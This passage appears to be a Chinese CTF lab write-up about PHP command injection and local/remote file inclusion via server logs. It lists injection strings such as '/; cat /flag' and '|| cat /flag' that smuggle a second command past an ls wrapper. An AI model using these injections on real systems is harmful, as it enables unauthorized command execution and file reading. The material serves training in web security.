要得到这个文件并将其展现在返回窗口，要先获得文件目录，和 ls 对应的 PHP 函数是 scandir()，scandir(.) 则是在当前目录，但是这个 . 也是非法字符，就需要构造一个 . 出来，通常的做法是：

需要绕过 ls 指令执行 cat 指令，常规绕过方式有：

  1. 分号 (;) 顺序执行：输入 /; cat /flag 或 /; cat flag.php。系统会先执行 ls /，执行完毕后接着执行你的 cat 命令。
  2. 逻辑或 (||) 短路执行：输入 fake_dir || cat /flag。故意给 ls 提供一个不存在的目录使其报错，进而触发后面的 cat 命令。
  3. 逻辑与 (&&) 拼接：输入 / && cat /flag。
  4. 管道符 (|)：如果不知道 flag 的具体名字，可以先尝试输入 /; find / -name "flag*" 或 | ls / | grep flag 进行搜索定位。

日志文件包含

打开靶场发现 PHP LFI/RFI Code Executor。

  • LFI：本地文件包含漏洞，让服务器包含并执行本地文件。
  • RFI：远程文件包含漏洞，让服务器包含并执行远程服务器上的文件。

WEB 端通常是没有访问服务器文件的权限的，但是可以尝试访问 WEB 端允许访问的 Linux 日志：

  • Apache 日志：Apache HTTP Server 的日志，记录所有 HTTP 请求。
  • Nginx 日志：Nginx Web 服务器自己的日志，记录 HTTP 请求和错误。
  • SSH 日志：系统认证日志，记录所有认证事件，通常只 root 可读。
